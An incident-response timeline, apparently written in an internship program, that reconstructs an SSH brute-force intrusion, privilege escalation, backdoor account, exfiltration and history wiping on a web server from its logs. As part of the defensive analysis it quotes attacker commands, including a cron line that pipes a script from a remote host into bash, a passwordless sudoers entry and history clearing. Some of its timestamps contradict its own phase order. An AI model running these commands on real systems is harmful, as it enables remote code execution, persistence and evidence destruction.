# ⏱️ Attack Timeline — Minute-by-Minute Reconstruction
### Host: webserver01 | Date: 10 March 2024 | Log Sources: auth.log + syslog.log

---

## Phase 0 — Normal Baseline (09 March 2024)

The following events from 09 March establish the clean baseline of legitimate activity:

| Time | Event | User / Process | Log Source | Assessment |
|---|---|---|---|---|
| 06:10–23:52 | certbot TLS renewal cron jobs | root | syslog | ✅ Normal — scheduled task |
| 07:27 | SSH login via public-key | aritra (203.0.113.7) | auth.log | ✅ Normal — key-based auth |
| 17:58 | SSH login via public-key | deploy (203.0.113.22) | auth.log | ✅ Normal — key-based auth |
| 08:56–23:52 | sudo — tail nginx / systemctl restart | aritra, ubuntu, deploy | auth.log | ✅ Normal — admin ops |
| Periodic | DHCP lease renewals (eth0 → 10.0.0.15) | kernel | syslog | ✅ Normal — dynamic IP |
| Periodic | logrotate cron jobs | root | syslog | ✅ Normal — log maintenance |

---

## Phase 1 — Reconnaissance & Brute-Force (03:14 – 03:43)

**Attacker IP:** `198.51.100.23`

| Timestamp | auth.log Entry | Event |
|---|---|---|
| 03:14:02 | Invalid user "database" — Failed password | Brute-force begins |
| 03:14:35 | Invalid user "postgres" — Failed password | Username enumeration |
| 03:15:17 | Invalid user "pi" — Failed password | Dictionary attack |
| 03:16:34 | Invalid user "support" — Failed password | Dictionary attack |
| 03:17:21 | Invalid user "admin" — Failed password | Dictionary attack |
| 03:18:09 | Invalid user "www-data" — Failed password | Dictionary attack |
| 03:19:44 | Invalid user "test" — Failed password | Dictionary attack |
| 03:20:33 | Invalid user "oracle" — Failed password | Dictionary attack |
| 03:21:18 | Invalid user "git" — Failed password | Dictionary attack |
| 03:22:05 | Invalid user "user" — Failed password | Dictionary attack |
| 03:22:29–03:37 | Invalid users: vagrant, guest, ubuntu, mysql… | Continued sweep (20+ probes) |
| 03:32:29 | Disconnecting: Too many authentication failures | MaxAuthTries hit |
| 03:38:21 | Failed password for **backup** (attempt 1) | Real account targeted |
| 03:39:44 | Failed password for **backup** (attempt 2) | Targeted attack |
| 03:40:58 | Failed password for **backup** (attempt 3) | Targeted attack |
| 03:41:33 | Failed password for **backup** (attempt 4) | Targeted attack |
| 03:42:07 | Failed password for **backup** (attempt 5) | Targeted attack |
| 03:42:51 | Failed password for **backup** (attempt 6) | Targeted attack |
| 03:43:29 | Failed password for **backup** (attempt 7) | Targeted attack |
| 03:43:56 | Failed password for **backup** (attempt 8) | Targeted attack |

**Syslog correlation during Phase 1:**

| Timestamp | syslog Entry | Significance |
|---|---|---|
| 03:20:04 | CRON[4406]: curl -s http://192.0.2.99/update.sh \| bash | C2 beacon already executing — cron pre-installed |
| 03:20:05 | IPTABLES-OUT: DST=192.0.2.99 DPT=443 SYN | Outbound C2 connection confirmed |
| 03:30:06 | CRON[4408]: curl -s http://192.0.2.99/update.sh \| bash | C2 repeating (every 10 min) |
| 03:40:11 | CRON[4414]: curl -s http://192.0.2.99/update.sh \| bash | C2 repeating |

> **Key Insight:** The C2 cron job was executing BEFORE the SSH intrusion succeeded in auth.log — suggesting the attacker had a prior foothold or the cron was injected via a different initial vector.

---

## Phase 2 — Intrusion & Privilege Escalation (03:45 – 03:46)

| Timestamp | Log Entry | Event | Log Source |
|---|---|---|---|
| 03:45:16 | **Accepted password for backup from 198.51.100.23 port 47361** | ✅ INTRUSION SUCCESSFUL | auth.log |
| 03:45:16 | pam_unix: session opened for user backup | Session established | auth.log |
| 03:45:36 | sudo: backup → root: /usr/bin/id | Privilege recon — checking current ID | auth.log |
| 03:45:41 | sudo: backup → root: /usr/bin/cat /etc/sudoers | Reading sudoers — scoping privileges | auth.log |
| 03:46:21 | **sudo: backup → root: /bin/bash** | **FULL ROOT SHELL OBTAINED** | auth.log |
| 03:23:40 | systemd: Started Session c1031 of user root | Root session confirmed | syslog |

---

## Phase 3 — Persistence Installation (03:47 – 03:48)

| Timestamp | Command / Event | Impact | Log Source |
|---|---|---|---|
| 03:47:11 | useradd sysupdate (UID=1002, GID=1002) | Backdoor account created | auth.log |
| 03:47:19 | passwd: password changed for sysupdate | Backdoor account secured | auth.log |
| 03:47:31 | usermod -aG sudo sysupdate | Sudo privileges granted to backdoor | auth.log |
| 03:47:46 | echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers | Passwordless root — permanent persistence | auth.log |
| 03:48:26 | crontab: */10 * * * * curl -s http://192.0.2.99/update.sh \| bash | C2 beacon installed in root crontab | auth.log |

---

## Phase 4 — Data Staging & Exfiltration (03:23 – 03:24)

*(Note: syslog timestamps indicate this occurred during/after persistence phase)*

| Timestamp | syslog Entry | Event |
|---|---|---|
| 03:23:10 | EXECVE: /bin/tar czf /tmp/.cache_bkp.tar.gz /var/www/html /etc/nginx | Web root + nginx config archived |
| 03:23:40 | systemd: Started Session c1031 of user root | Root session active during exfil |
| 03:23:55 | IPTABLES-OUT: DST=192.0.2.99 LEN=1420 PSH+ACK | Data transfer — large packet sent |
| 03:23:58 | IPTABLES-OUT: DST=192.0.2.99 LEN=1420 PSH+ACK | Data transfer continues |
| 03:24:00 | IPTABLES-OUT: DST=192.0.2.99 LEN=980 ACK+FIN | Transfer complete — connection closed |

**Data exfiltrated:**
- `/var/www/html` — Complete web application source code
- `/etc/nginx` — nginx server configuration (may contain API keys, backend URLs)
- Destination: `192.0.2.99:443` via HTTPS port (bypasses basic egress filtering)

---

## Phase 5 — Anti-Forensics & Exit (03:48 – 03:49)

| Timestamp | Command | Purpose |
|---|---|---|
| 03:48:51 | echo > /home/backup/.bash_history | Wipe bash history of compromised account |
| 03:48:59 | history -c | Clear current shell history |
| 03:49:19 | pam_unix: session closed for user backup | Attacker disconnects |

---

## Phase 6 — Backdoor Re-Entry (06:03 – 06:33)

| Timestamp | auth.log Entry | Event |
|---|---|---|
| 06:03:19 | **Accepted password for sysupdate from 198.51.100.23** | Attacker returns via backdoor account |
| 06:03–06:33 | Session active (30 minutes — limited log visibility) | Possible further recon or payload deployment |
| 06:33:19 | pam_unix: session closed for user sysupdate | Attacker exits |

---

## Phase 7 — Post-Compromise Probing (12:10 – 12:40)

| Timestamp | auth.log Entry | Assessment |
|---|---|---|
| 12:10 | Failed password for root from 198.51.100.23 | Attacker probing direct root login |
| 12:40 | Failed password for admin from 198.51.100.23 | Continued post-compromise enumeration |
| 17:07+ | Logins by aritra, ubuntu, deploy (public-key) | Legitimate users — unaware of compromise |

---

*Timeline reconstructed by: Harmain Shah | Intern ID: CA0200 | Cryptonic Area Internship Program*
